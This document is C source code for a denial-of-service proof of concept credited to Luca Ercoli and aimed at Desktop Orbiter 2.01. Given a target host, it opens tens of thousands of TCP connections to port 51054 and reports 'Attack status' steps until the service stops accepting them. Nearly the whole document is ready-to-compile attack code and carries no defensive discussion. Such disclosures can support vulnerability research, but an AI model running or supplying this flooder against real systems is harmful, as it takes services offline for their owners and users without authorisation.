#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 51054

int main(int argc, char *argv[]){

int sockfd;
struct hostent *he;
struct sockaddr_in their_addr;

int c;
int n;
char *host = NULL;
int cnt=1;

if(argc < 2 ) {
printf("Usage:%s -h <host>\n",argv[0]);
exit(0);
}


while((n = getopt(argc, argv, "h")) != -1) {
                switch(n) {
                        case 'h':
                        host = optarg;
                        break;

                        default:
                        printf("Bad Input\n");
                        exit(0);
                }
        }


if ((he = gethostbyname(argv[2])) == NULL)
          {
                  herror("gethostbyname");
                  exit(1);
          }

        their_addr.sin_family = AF_INET;
        their_addr.sin_port = htons(PORT);
        their_addr.sin_addr = *((struct in_addr *) he->h_addr);
        bzero(&(their_addr.sin_zero), 8);

printf
("\n\n\t\t#########################################################\n");
printf("\t\t# Proof of Concept by Luca Ercoli luca.ercoli@inwind.it #\n");
printf("\t\t#         Desktop Orbiter 2.01 Denial of Service        #\n");
printf
("\t\t#########################################################\n\n");
printf("\nAttacking....\n\a");


if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
          {
                  perror("socket");
                  exit(1);
          }

       if (connect (sockfd, (struct sockaddr *) &their_addr,sizeof(struct
sockaddr)) == -1)
          {
                 perror("connect");
exit(0);
}


for (c=0;c<99500;c++){

if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
          {
                  perror("socket");
                  exit(1);
          }


        if (connect (sockfd, (struct sockaddr *) &their_addr,
sizeof(struct sockaddr)) == -1)
          {

printf("\n[Attack status] Step %d/25 : Complete!",cnt);

if (cnt == 25) {
printf("\nAttack Complete!\n\n\a");
exit(0);
}

cnt++;

sleep(1);

          }


close(sockfd);

}

printf("\n");
return 1;

}
